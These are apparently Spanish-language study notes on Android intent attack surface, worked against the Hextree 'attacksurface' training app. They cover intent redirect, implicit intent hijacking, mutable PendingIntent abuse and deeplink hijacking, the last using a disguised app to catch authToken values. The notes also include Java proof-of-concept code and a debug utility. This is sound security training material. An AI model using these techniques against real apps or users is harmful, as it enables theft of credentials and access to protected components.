---
title: Intents
sidebar_position: 1
---

## ¿Qué es?
Una descripción intuitiva de los intents podría ser: «Declarar la intención de hacer algo y dejar que Android averigüe qué aplicación puede hacerlo».

## Implicit vs Explicit

Dentro de las etiquetas `<activity>` también se puede encontrar un `<intent-filter>`. Esta tag indica que se trata de un implicit intent. Esto quiere decir que la app declara que puede manejar ese tipo de intent, por ejemplo MediaStore.ACTION_IMAGE_CAPTURE para capturar una imagen. Es posible ver como se resuelven estos intents, si añadimos la siguiente flag:

intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION)

## EXPLICIT INTENTS

### Iniciar activities

Las activities son responsables de mostrar la pantalla de una aplicación. Por lo tanto, si la aplicación tiene varias pantallas, se puede utilizar `startActivity()` para iniciar otra activity. Para ello, se debe crear un objeto Intent y seleccionar la activity.

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity"));
startActivity(intent);
```

Una sintaxis alternativa para especificar el paquete y la activity de destino también es:

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity");
startActivity(intent);
```

Una app puede iniciar cualquiera de sus propias activities, pero para permitir que otras aplicaciones inicien tu activity, estas deben exportarse. También hay una activity exportada por defecto, que es la "launcher activity” que se utiliza como punto de entrada principal a la app. Esto permite que la pantalla de inicio o la aplicación de inicio inicien tu aplicación cuando haces clic en ella.

### Intent con action

Para enviar un intent con action (la app usa `getIntent().getAction()`)se puede usar el siguiente codigo:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

### Intent con datauri

Para enviar un intent con action (la app usa `getIntent().getData()`)se puede usar el siguiente codigo:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
intent.setAction("io.hextree.action.GIVE_FLAG");
intent.setData(Uri.parse("https://app.hextree.io/map/android"));
startActivity(intent);

```

### Intent con Extra

Para enviar un intent con action (la app usa `getIntent().getExtra(), getIntExtra(), etc...`) (En los extras pueden ir muchos tipos de datos e incluso serializacion y/o estructuras de datos, incluso se pueden mandar intents dentro de intents)se puede usar el siguiente codigo:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
intent.setExtra("NAME",12);
intent.setData(Uri.parse("https://app.hextree.io/map/android"));
startActivity(intent);

```

### Intent dentro de Intent

Enviar un intent dentro de un intent en el extra:

```java
Intent intent3 = new Intent();
intent3.putExtra("reason","back");

Intent intent2 = new Intent();
intent2.putExtra("nextIntent",intent3);
intent2.putExtra("return",42);

Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
intent.putExtra("android.intent.extra.INTENT",intent2);

Utils.showDialog(MainActivity.this, intent);
startActivity(intent);
```

### Intent con onNewIntent

Para enviar un intent que triggeree el onNewIntent del ciclo de vida de la activity, es necesario enviar dos intents con un delay (el uso de sleep es malo, porque puede que la app se rompa al congelar el thread principal, pero como PoC rapida se puede usar), de igual forma es necesaria la flag de single top para que no se abra otra instancia de la activity:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
intent.setAction("OPEN");
startActivity(intent);
try {
   Thread.sleep(500);
} catch (InterruptedException e) {
   throw new RuntimeException(e);
}
Intent intent2 = new Intent();
intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
intent2.setAction("REOPEN");
intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
startActivity(intent2);
```

### Intent Redirect

Si una activity no esta exportada, pero hay alguna activity que si esta exportada y utiliza el intent enviado para abrir una activity (Se tiene control sobre startActivity(CONTROLAQUI)) es posible llevar a cabo un ataque de tipo Intent Redirect, para abrir esa Activity no exportada desde una Activity si exportada, en este caso flag6 no esta exportada, pero el intent3 se utiliza directamente en StartActivity:

```java
Intent intent3 = new Intent();
intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
intent3.putExtra("reason","next");

Intent intent2 = new Intent();
intent2.putExtra("nextIntent",intent3);
intent2.putExtra("return",42);

Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
intent.putExtra("android.intent.extra.INTENT",intent2);

Utils.showDialog(MainActivity.this, intent);
startActivity(intent);
                
               
```

Algo importante respecto al intent redirect, es que es posible obtener acceso a ficheros arbitarios y content providers.

### Intent Response

Hay intents que dan una respuesta cuando los llamas, por ejemplo, llamar a la camara y tomar una foto, dara como respuesta la imagen, en este caso, es posible observar dicha respuesta desde la activity(nuesta) de donde llamamos a la activity de la app(cliente):

```java
private static final int REQ = 1337;
@Override protected void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	Intent i = new Intent();
	i.setComponent(new ComponentName(
	  "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag8Activity"
  ));
  // IMPORTANTE: startActivityForResult desde una Activity
  startActivityForResult(i, REQ);
}

@Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	super.onActivityResult(requestCode, resultCode, data);
  TextView text = findViewById(R.id.textView213);
  String texto = data.getStringExtra("flag");
  text.setText(texto);
}
                
               
```

## IMPLICIT INTENTS

### Intent Hijacking

Cuando la aplicación manda a llamar a implicit intents, es posible llevar a cabo su manejo, agregandolos en el androidmanifest y llevando a cabo su manejo en Java, por ejemplo si la app crea un `Intent intent = **new** Intent("io.hextree.attacksurface.ATTACK_ME");`, seria necesario agregar en el AndroidManifest:: 

```xml
        <activity
            android:name=".recibidorintent"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>     
               
```

Y posteriormente llevar a cabo el manejo de la información que se envie mediante el codigo JAVA de la activity:

```java
Intent receivedIntent = getIntent();
String sharedText = receivedIntent.getStringExtra("flag");
if (sharedText != null) {
	TextView debugText = findViewById(R.id.debug_text);
  debugText.setText("Shared: " + sharedText);
}  
               
```

### Intent Hijacking con Result

Cuando la aplicación manda a llamar a implicit intents, y requiere que se le mande una respuesta, es posible llevar a cabo su manejo, agregandolos en el androidmanifest y llevando a cabo su manejo en Java, por ejemplo si la app crea un `Intent intent = **new** Intent("io.hextree.attacksurface.ATTACK_ME");` y posteriormente usa el metodo **`public** **void** onActivityResult(**int** i, **int** i2, Intent intent)`, seria necesario agregar en el AndroidManifest:: 

```xml
        <activity
            android:name=".recibidorintent"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>     
               
```

Y posteriormente llevar a cabo el manejo de la información que se envie mediante el codigo JAVA de la activity:

```java
Intent receivedIntent = getIntent();

Intent returnIntent = new Intent();
returnIntent.putExtra("token",1094795585);
setResult(Activity.RESULT_OK, returnIntent); // Set the result code and data
finish(); // Close the second activity
```

## PENDING INTENTS

Los pending intents permiten que una aplicación cree un intent de inicio de actividad y se la envíe a otra aplicación para que inicie la actividad en su nombre.

Esto puede parecer un intent redirect, y si!, los pending intents funcionan básicamente bajo este principio. La única diferencia es que la el pending intent que se la aplicación A envia a la aplicación B se ejecutará con el permiso de la aplicación original (Aplicación A).

Aunque esto mitiga el caso de Intent Redirect, se genera un nuevo problema, ya que si una aplicación, nos envia un pending intent, podriamos ejecutarlo con sus permisos desde nuestra app de atacante.

Hay dos tipos de pending Intents, mutable e inmutable. Los mutables suelen ser interesantes ya que permiten que se modifiquen los datos del intent antes de su ejecución.

Para llevar a cabo este ataque, obviamente primero se tiene que enviar un intent a la app, en este caso se envia un PendingIntent que apunta a “Catcher” dentro del extra “PENDING”, para que al enviarlo, lo ejecute la app del tercero, en este caso es mutable porque la app lo modifica antes de llevar a cabo su ejecución:

```java
                Intent receive = new Intent(launchHextreetest.this, catcher.class);
                int flags = PendingIntent.FLAG_MUTABLE;

                PendingIntent pendingIntent2 = PendingIntent.getActivity(
                        launchHextreetest.this,
                        0,
                        receive,
                        flags
                );

                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag22Activity"
                ));

                intent.putExtra("PENDING", pendingIntent2);

                startActivity(intent);
```

Cuando la app modifique y ejecute dicho PendingIntent es necesario que lo reciba otra activity, en este caso “catcher”, que contiene el siguiente codigo:

```java
        Intent intent1 = getIntent();
        String flag = intent1.getStringExtra("flag");
        TextView textoflag = findViewById(R.id.flagviewer);

        textoflag.setText(flag);
```

De igual forma existe el caso contrario, en el que nuestra app reciba el PendingIntent y lo modifique, para esto es necesario llevar a cabo el handling y modificación del intent, asi como agregar en el AndroidManifest su manejo:

```java
        Intent receivedIntent = getIntent();
        PendingIntent pending = (PendingIntent) receivedIntent.getParcelableExtra("pending_intent");
        Intent intent = new Intent();
        intent.setAction("io.hextree.attacksurface.GIVE_FLAG");
        intent.putExtra("code",42);
        try {
            pending.send(this, 0, intent);
        } catch (PendingIntent.CanceledException e) {
            throw new RuntimeException(e);
        }
```

## DEEP LINKS

Los deeplinks nos permiten abrir una app desde un navegador, y funcionan bajo el mismo principio que los intents, en este caso, se requiere que se cuente con el intent filter de browsable, y regularmente tienen un scheme(Aunque no necesariamente) (Obviamente el intent tiene que estar exportado para que se pueda llamar desde la url):

```java
       <activity android:name="io.hextree.attacksurface.activities.Flag13Activity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="hex"/>
                <data android:host="open"/>
                <data android:host="flag"/>
            </intent-filter>
```

Un deeplink para el codigo anterior podria ser hex://open o hex://flag.

De igual forma, se puede utilizar la etiqueta nav-graph dentro del AndroidManifest.xml y dentro de dicha navegacion incluir la tag deepLink (al decompilar con jadx-gui, se observara dentro del intent filter normal como el ejemplo de arriba, esto es solo si se analiza codigo fuente).

### Deeplink Hijacking

De igual forma, asi como es posible generar un deeplink, es posible generar una app que simule que tambien tiene dichos deeplinks, logrando que por ejemplo, si se envian credenciales en dicha app por medio del deeplink, registremos el deeplink, y si el usuario lo selecciona, se nos envien las credenciales a nosotros. Para esto bastaria con registrar nuestro deeplink y posteriormente llevar a cabo su manejo (De igual forma podemos modificar el nombre, foto y descripcion de la app para que sea mas facil que el usuario le de click)

```java
       <activity android:name="io.cabr4.ladrondeeplink" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="hex"/>
                <data android:host="open"/>
                <data android:host="flag"/>
            </intent-filter>
```

De igual forma, obviamente se tiene que hacer su manejo en java, a continuacion se muestra un ejemplo:

```java
        Intent intent = getIntent();
        Uri data = intent.getData();
        String queryParameter = data.getQueryParameter("type");
        String queryParameter2 = data.getQueryParameter("authToken");
        String queryParameter3 = data.getQueryParameter("authChallenge");

        TextView texto1 = findViewById(R.id.texto);
        TextView texto2 = findViewById(R.id.texto2);
        TextView texto3 = findViewById(R.id.texto3);
        texto1.setText(queryParameter);
        texto2.setText(queryParameter2);
        texto3.setText(queryParameter3);
```

### Chrome Custom Intent

Chrome cuenta con un schema custom para los intents, el cual cuenta con muchas mas caracteristicas que los deeplinks regulares, lo que lo hace muy interesante. Docu: https://developer.chrome.com/docs/android/intents?hl=es-419

```java
intent:  
   HOST/URI-path // Optional host  
   #Intent;  
      package=\[string\];  
      action=\[string\];  
      category=\[string\];  
      component=\[string\];  
      scheme=\[string\];  
   end;
```

Ejemplo: `intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;S.browser_fallback_url=http%3A%2F%2Fzxing.org;end`

Si el intent-filter no contiene un host o path filter, se coloca intent:#intent y no intent://

### App Links

Algo relevante a mencionar es que existen los applinks, los cuales verifican que la aplicacion este autorizada para utilizar dicho deeplink, haciendo que no sea posible hacer un deeplink hijacking

### Intent Debugger :)

Al trabajar con intents es posible que no funcione el exploit, o que no se sepa exactamente que esta enviando el intent, por lo cual es posible crear un fichero Utils.java con el siguiente codigo.

Este codigo tiene multiples funciones relevantes. Una de ellas es showDialog, la cual se llamaria desde nuestra activity en donde estamos enviando el intent como Utils.showDialog(this, intent) . (this tiene que hacer referencia a la activity actual o en su caso poner la activity p. ej. Utils.showDialog(MainActivity.this, intent);
)Esto se encargaria de mostrar un popup con todos los datos relevantes del intent que estamos enviando.

```java
// package com....

import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.Set;

public class Utils {
    public static String dumpIntent(Context context, Intent intent) {
        return dumpIntent(context, intent, 0);
    }

    private static String dumpIntent(Context context, Intent intent, int indentLevel) {
        if (intent == null) {
            return "Intent is null";
        }

        StringBuilder sb = new StringBuilder();
        String indent = new String(new char[indentLevel]).replace("\0", "    ");

        // Append basic intent information
        sb.append(indent).append("[Action]    ").append(intent.getAction()).append("\n");
        // Append categories
        Set<String> categories = intent.getCategories();
        if (categories != null) {
            for (String category : categories) {
                sb.append(indent).append("[Category]  ").append(category).append("\n");
            }
        }
        sb.append(indent).append("[Data]      ").append(intent.getDataString()).append("\n");
        sb.append(indent).append("[Component] ").append(intent.getComponent()).append("\n");
        sb.append(indent).append("[Flags]     ").append(getFlagsString(intent.getFlags())).append("\n");

        // Append extras
        Bundle extras = intent.getExtras();
        if (extras != null) {
            for (String key : extras.keySet()) {
                Object value = extras.get(key);
                if (value instanceof Intent) {
                    sb.append(indent).append("[Extra:'").append(key).append("'] -> Intent\n");
                    // Recursively dump nested intents with increased indentation
                    sb.append(dumpIntent(context, (Intent) value, indentLevel + 1));  
                } else if (value instanceof Bundle) {
                    sb.append(indent).append("[Extra:'").append(key).append("'] -> Bundle\n");
                    // Recursively dump nested intents with increased indentation
                    sb.append(dumpBundle((Bundle) value, indentLevel + 1));
                } else {
                    sb.append(indent).append("[Extra:'").append(key).append("']: ").append(value).append("\n");
                }
            }
        }

        // Query the content URI if FLAG_GRANT_READ_URI_PERMISSION is set
        /*
        if ((intent.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0) {
            Uri data = intent.getData();
            if (data != null) {
                sb.append(queryContentUri(context, data, indentLevel + 1));
            }
        }
        */

        return sb.toString();
    }
    
    public static String dumpBundle(Bundle bundle) {
        return dumpBundle(bundle, 0);
    }

    private static String dumpBundle(Bundle bundle, int indentLevel) {
        if (bundle == null) {
            return "Bundle is null";
        }

        StringBuilder sb = new StringBuilder();
        String indent = new String(new char[indentLevel]).replace("\0", "    ");

        for (String key : bundle.keySet()) {
            Object value = bundle.get(key);
            if (value instanceof Bundle) {
                sb.append(String.format("%s['%s']: Bundle[\n%s%s]\n", indent, key, dumpBundle((Bundle) value, indentLevel + 1), indent));
            } else {
                sb.append(String.format("%s['%s']: %s\n", indent, key, value != null ? value.toString() : "null"));
            }
        }
        return sb.toString();
    }

    private static String getFlagsString(int flags) {
        StringBuilder flagBuilder = new StringBuilder();
        if ((flags & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0) flagBuilder.append("GRANT_READ_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0) flagBuilder.append("GRANT_WRITE_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION) != 0) flagBuilder.append("GRANT_PERSISTABLE_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_GRANT_PREFIX_URI_PERMISSION) != 0) flagBuilder.append("GRANT_PREFIX_URI_PERMISSION | ");
        if ((flags & Intent.FLAG_ACTIVITY_NEW_TASK) != 0) flagBuilder.append("ACTIVITY_NEW_TASK | ");
        if ((flags & Intent.FLAG_ACTIVITY_SINGLE_TOP) != 0) flagBuilder.append("ACTIVITY_SINGLE_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_HISTORY) != 0) flagBuilder.append("ACTIVITY_NO_HISTORY | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_TOP) != 0) flagBuilder.append("ACTIVITY_CLEAR_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_FORWARD_RESULT) != 0) flagBuilder.append("ACTIVITY_FORWARD_RESULT | ");
        if ((flags & Intent.FLAG_ACTIVITY_PREVIOUS_IS_TOP) != 0) flagBuilder.append("ACTIVITY_PREVIOUS_IS_TOP | ");
        if ((flags & Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS) != 0) flagBuilder.append("ACTIVITY_EXCLUDE_FROM_RECENTS | ");
        if ((flags & Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT) != 0) flagBuilder.append("ACTIVITY_BROUGHT_TO_FRONT | ");
        if ((flags & Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED) != 0) flagBuilder.append("ACTIVITY_RESET_TASK_IF_NEEDED | ");
        if ((flags & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0) flagBuilder.append("ACTIVITY_LAUNCHED_FROM_HISTORY | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET) != 0) flagBuilder.append("ACTIVITY_CLEAR_WHEN_TASK_RESET | ");
        if ((flags & Intent.FLAG_ACTIVITY_NEW_DOCUMENT) != 0) flagBuilder.append("ACTIVITY_NEW_DOCUMENT | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_USER_ACTION) != 0) flagBuilder.append("ACTIVITY_NO_USER_ACTION | ");
        if ((flags & Intent.FLAG_ACTIVITY_REORDER_TO_FRONT) != 0) flagBuilder.append("ACTIVITY_REORDER_TO_FRONT | ");
        if ((flags & Intent.FLAG_ACTIVITY_NO_ANIMATION) != 0) flagBuilder.append("ACTIVITY_NO_ANIMATION | ");
        if ((flags & Intent.FLAG_ACTIVITY_CLEAR_TASK) != 0) flagBuilder.append("ACTIVITY_CLEAR_TASK | ");
        if ((flags & Intent.FLAG_ACTIVITY_TASK_ON_HOME) != 0) flagBuilder.append("ACTIVITY_TASK_ON_HOME | ");
        if ((flags & Intent.FLAG_ACTIVITY_RETAIN_IN_RECENTS) != 0) flagBuilder.append("ACTIVITY_RETAIN_IN_RECENTS | ");
        if ((flags & Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT) != 0) flagBuilder.append("ACTIVITY_LAUNCH_ADJACENT | ");
        if ((flags & Intent.FLAG_ACTIVITY_REQUIRE_DEFAULT) != 0) flagBuilder.append("ACTIVITY_REQUIRE_DEFAULT | ");
        if ((flags & Intent.FLAG_ACTIVITY_REQUIRE_NON_BROWSER) != 0) flagBuilder.append("ACTIVITY_REQUIRE_NON_BROWSER | ");
        if ((flags & Intent.FLAG_ACTIVITY_MATCH_EXTERNAL) != 0) flagBuilder.append("ACTIVITY_MATCH_EXTERNAL | ");
        if ((flags & Intent.FLAG_ACTIVITY_MULTIPLE_TASK) != 0) flagBuilder.append("ACTIVITY_MULTIPLE_TASK | ");
        if ((flags & Intent.FLAG_RECEIVER_REGISTERED_ONLY) != 0) flagBuilder.append("RECEIVER_REGISTERED_ONLY | ");
        if ((flags & Intent.FLAG_RECEIVER_REPLACE_PENDING) != 0) flagBuilder.append("RECEIVER_REPLACE_PENDING | ");
        if ((flags & Intent.FLAG_RECEIVER_FOREGROUND) != 0) flagBuilder.append("RECEIVER_FOREGROUND | ");
        if ((flags & Intent.FLAG_RECEIVER_NO_ABORT) != 0) flagBuilder.append("RECEIVER_NO_ABORT | ");
        if ((flags & Intent.FLAG_RECEIVER_VISIBLE_TO_INSTANT_APPS) != 0) flagBuilder.append("RECEIVER_VISIBLE_TO_INSTANT_APPS | ");

        if (flagBuilder.length() > 0) {
            // Remove the trailing " | "
            flagBuilder.setLength(flagBuilder.length() - 3);
        }

        return flagBuilder.toString();
    }

    public static void showDialog(Context context, Intent intent) {
        if(intent == null) return;
        // Create the dialog
        Dialog dialog = new Dialog(context);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setCancelable(true);

        // Create a LinearLayout to hold the dialog content
        LinearLayout layout = new LinearLayout(context);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 50, 20, 50);
        layout.setBackgroundColor(0xffefeff5);

        // Add a TextView for the title
        TextView title = new TextView(context);
        title.setText("Intent Details: ");
        title.setTextSize(16);
        title.setTextColor(0xff000000);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setPadding(0, 0, 0, 40);
        title.setGravity(Gravity.CENTER);
        title.setBackgroundColor(0xffefeff5);
        layout.addView(title);

        // Add a TextView for the message
        TextView message = new TextView(context);
        message.setText(dumpIntent(context, intent));
        message.setTypeface(Typeface.MONOSPACE);
        message.setTextSize(12);
        message.setTextColor(0xff000000);
        message.setPadding(0, 0, 0, 30);
        message.setGravity(Gravity.START);
        message.setBackgroundColor(0xffefeff5);
        layout.addView(message);

        // Add an OK button
        Button positiveButton = new Button(context);
        positiveButton.setText("OK");
        positiveButton.setTextColor(0xff000000);
        positiveButton.setOnClickListener(v -> dialog.dismiss());
        layout.addView(positiveButton);

        // Set the layout as the content view of the dialog
        dialog.setContentView(layout);

        // Adjust dialog window parameters to make it fullscreen
        Window window = dialog.getWindow();
        if (window != null) {
            window.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            window.setBackgroundDrawableResource(android.R.color.transparent);
            WindowManager.LayoutParams wlp = window.getAttributes();
            wlp.gravity = Gravity.BOTTOM;
            wlp.flags &= ~WindowManager.LayoutParams.FLAG_DIM_BEHIND;
            window.setAttributes(wlp);
        }

        dialog.show();
        // Animate the dialog with a slide-in effect
        layout.setTranslationY(2000); // Start off-screen to the right
        layout.setAlpha(0f);
        ObjectAnimator translateYAnimator = ObjectAnimator.ofFloat(layout, "translationY", 0);
        ObjectAnimator alphaAnimator = ObjectAnimator.ofFloat(layout, "alpha", 1f);
        AnimatorSet animatorSet = new AnimatorSet();
        animatorSet.playTogether(translateYAnimator, alphaAnimator);
        animatorSet.setDuration(300); // Duration of the animation
        animatorSet.setStartDelay(100); // Delay before starting the animation
        animatorSet.start();
    }
}
```

## **Incoming Intent**

El objeto intent que se utilizó para iniciar una actividad está disponible para la aplicación a través de getIntent(). Esta función se utiliza para pasar datos a otras aplicaciones, por lo que se convierte en una importante superficie de ataque.